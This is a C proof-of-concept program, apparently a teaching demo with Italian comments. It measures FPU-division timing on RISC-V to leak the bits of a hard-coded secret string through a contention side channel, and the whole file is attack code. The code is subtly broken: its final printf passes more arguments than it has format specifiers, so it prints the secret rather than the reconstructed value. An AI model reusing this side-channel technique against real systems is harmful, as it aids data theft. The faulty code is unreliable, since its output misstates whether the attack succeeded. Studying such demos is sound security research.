#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include "cache.h"

#define SECRET_LEN 85
#define NUM_TRIALS 10
#define THRESHOLD 3500  // Soglia determinata empiricamente

char* secretStr = "!\"#ThisIsTheSecretString:)abcdefghijklmnopqrtsuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!£$%&?*";

/* Inizializza i registri FP con valori validi */
void init_fp_registers() {
    uint32_t one = 0x3F800000;  // 1.0 in IEEE-754
    uint32_t two = 0x40000000;  // 2.0 in IEEE-754
    
    asm volatile("fmv.s.x ft1, %0" : : "r"(one));
    asm volatile("fmv.s.x ft2, %0" : : "r"(two));
    asm volatile("fmv.s.x ft4, %0" : : "r"(one));
    asm volatile("fmv.s.x ft5, %0" : : "r"(two));
}

/* Funzione vittima che esegue operazioni FP se il bit è 1 */
void victim(uint8_t bit) {
    if(bit) {
        for(int i = 0; i < 500; i++) {
            asm volatile("fdiv.s ft0, ft1, ft2" ::: "ft0");
        }
    }
}

/* Funzione per misurare il contention sulla FPU */
uint64_t measure_fp_latency() {
    uint64_t start = rdcycle();
    
    for(int i = 0; i < 100; i++) {
        asm volatile("fdiv.s ft3, ft4, ft5" ::: "ft3");
    }
    
    return rdcycle() - start;
}

int main() {
    init_fp_registers();
    printf("Starting Crosstalk attack...\n\n");

    for(int c = 0; c < SECRET_LEN; c++) {
        uint8_t secret = secretStr[c];
        uint8_t reconstructed = 0;

        for(int bit = 0; bit < 8; bit++) {
            uint64_t total_time = 0;

            for(int trial = 0; trial < NUM_TRIALS; trial++) {
                // Fase di training
                for(int i = 0; i < 10; i++) {
                    victim(0);
                    measure_fp_latency();
                }

                // Fase di attacco
                uint8_t current_bit = (secret >> bit) & 1;
                victim(current_bit);
                total_time += measure_fp_latency();

                // Svuota lo stato della FPU
                flushCache(0, 0);  // Sfrutta la cache flush come barriera
            }

            // Decodifica il bit basandosi sulla latenza media
            if(total_time/NUM_TRIALS > THRESHOLD) {
                reconstructed |= (1 << bit);
            }
        }

        printf("Secret[%2d]: ('%c')  Reconstructed: ('%c')\n",
               c, secret, (secret > 31 && secret < 127) ? secret : '?',
               reconstructed, (reconstructed > 31 && reconstructed < 127) ? reconstructed : '?');
    }

    return 0;
}
